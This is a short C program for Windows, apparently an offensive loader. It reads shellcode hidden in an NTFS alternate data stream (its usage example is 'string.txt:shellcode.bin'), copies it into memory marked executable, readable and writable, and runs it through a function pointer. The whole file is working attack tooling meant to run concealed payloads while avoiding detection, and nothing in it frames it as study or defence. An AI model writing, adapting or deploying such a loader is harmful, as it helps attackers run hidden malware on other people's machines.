#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    // Verify the argument
    if (argc < 2) {
        printf("Usage: %s <PATH_TO_ADS>\n", argv[0]);
        printf("Example: %s \"C:\\Windows\\Temp\\string.txt:shellcode.bin\"\n", argv[0]);
        return 1;
    }

    const char* ads_path = argv[1]; 

    // Get an handle to the file
    HANDLE hFile = CreateFileA(ads_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Erreur : Impossible d'ouvrir le fichier (Code : %lu)\n", GetLastError());
        return 1;
    }

    // Get the size of the file
    DWORD size_shellcode = GetFileSize(hFile, NULL);
    if (size_shellcode == 0) { 
        CloseHandle(hFile); 
        return 1; 
    }

    // Allocate memory (RWX)
    void* gggg = VirtualAlloc(0, size_shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (gggg == NULL) {
        CloseHandle(hFile);
        return 1;
    }

    // Read the content of the ADS to the allocate memory
    DWORD bytesRead;
    if (!ReadFile(hFile, gggg, size_shellcode, &bytesRead, NULL)) {
        VirtualFree(gggg, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return 1;
    }

    CloseHandle(hFile);

    // Execution via Function Pointer Execution
    ((void(*)())gggg)();

    return 0;
}